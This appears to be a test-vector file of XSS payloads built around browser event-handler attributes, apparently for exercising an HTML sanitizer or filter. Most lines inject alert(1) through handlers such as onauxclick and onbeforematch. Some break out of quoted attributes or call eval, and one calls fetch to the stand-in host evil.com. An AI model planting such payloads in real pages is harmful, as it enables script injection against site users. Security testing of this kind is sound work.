#
# XSS Test Cases for 2025 Event Handler Updates
#
# This file contains test cases for newly added event handlers from:
# - WebKit EventNames.json
# - Chromium/Blink GlobalEventHandlers.idl
# - Firefox/Gecko EventNameList.h
#
# Updated: 2025-10-16
#

#
# New Event Handlers - Standard Format Tests
# Each event handler is tested in multiple contexts:
# - As an attribute
# - In unquoted value context
# - In single-quoted value context
# - In double-quoted value context
#

#
# ACCESSKEYNOTFOUND (Firefox)
#
<div onpageswap=alert(1)>

# Touch and gesture events
<div ontapgesture=alert(1)>
<div onswipegesture=alert(1)>
<div onpresstapgesture=alert(1)>
<div onrotategesture=alert(1)>
<div onmagnifygesture=alert(1)>

# Gamepad API events
<body ongamepadbuttondown=fetch('//evil.com')>
<div ongamepadaxismove=alert(document.domain)>

# Media events
<div onmediarecorderdataavailable=alert(1)>
<video onwebkitmediasessionmetadatachanged=alert(1)>

# Scroll snap events (CSS Scroll Snap)
<div onscrollsnapchange=alert(1) style="scroll-snap-type:y mandatory">
<div onscrollsnapchanging=alert(1) style="overflow:scroll">

# Pointer events raw update
<canvas onpointerrawupdate=alert(1)>

# Legacy DOM mutation events (deprecated but may still work)
<div onlegacydomactivate=alert(1)>
<div onlegacysubtreemodified=alert(1)>
<div onlegacynodeinserted=alert(1)>

# Editor events
<div contenteditable oneditorinput=alert(1)>
<div contenteditable oneditorbeforeinput=alert(1)>

# Form state change events
<input type="checkbox" onformcheckboxstatechange=alert(1)>
<input type="radio" onformradiostatechange=alert(1)>

# WebGL context events
<canvas oncontextlost=alert(1)></canvas>
<canvas oncontextrestored=alert(1)></canvas>

# Device orientation and light
<body ondeviceorientationabsolute=alert(1)>
<body ondevicelight=alert(1)>

# Real-world attack scenarios with new events

# Breaking out of attribute context
value" onauxclick="alert(1)
name' onbeforematch='alert(1)
id oncommand=alert(1) data="

# Escaping JavaScript string in event handler
<img onauxclick="var x=''; alert(1); var y='">
<div onbeforematch='var x=""; alert(1); var y=""'>

# Using in data attributes
<div data-action="submit" onauxclick=alert(1)>
<button data-cmd="save" oncommand=eval(this.dataset.cmd)>

# Combining with other XSS vectors
<svg><use href="#x" onauxclick=alert(1)></svg>
<math><mtext onbeforematch=alert(1)>text</mtext></math>

# Browser-specific edge cases
<div onmozvisualscroll=alert(1)>Mozilla</div>
<div onwebkitshadowrootattached=alert(1)>WebKit</div>
<input onwebkitautofillrequest=alert(1)>

# Event handler in template and slot
<template><div onauxclick=alert(1)></div></template>
<slot onbeforematch=alert(1)></slot>

# With shadow DOM
<div onwebkitshadowrootattached=alert(1)></div>

# Form-associated custom elements
<form onformsubmit=alert(1)>
<form onformreset=alert(1)>

# Intersection and resize observers contexts
<div onredraw=alert(1)>
<div onscrollend=alert(1)>

# VR/AR contexts (deprecated but may exist)
<div onvrdisplayactivate=alert(1)>
<div onvrdisplaypresentchange=alert(1)>
